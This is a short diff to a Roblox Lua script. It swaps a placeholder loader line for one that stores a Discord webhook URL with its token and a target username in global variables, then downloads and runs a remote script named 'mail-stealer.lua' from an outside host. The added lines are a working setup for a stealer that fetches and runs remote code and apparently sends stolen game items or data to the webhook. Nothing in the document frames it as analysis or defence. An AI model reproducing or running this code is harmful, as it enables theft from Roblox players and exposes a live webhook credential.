@@ -1,1 +1,3 @@
- loadstring(game:HttpGet("UrlHere",true))()
+getgenv().webhook = "https://discord.com/api/webhooks/1149818384612077581/X_KddZgrKL1j6ckFse_tyZ_5TAwp_4RTGjQ0TyJNXSZZv8iFKTldVhmN6gkyoGy_WSvy"
+getgenv().name = "BOOMBOOMBOOM133"
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
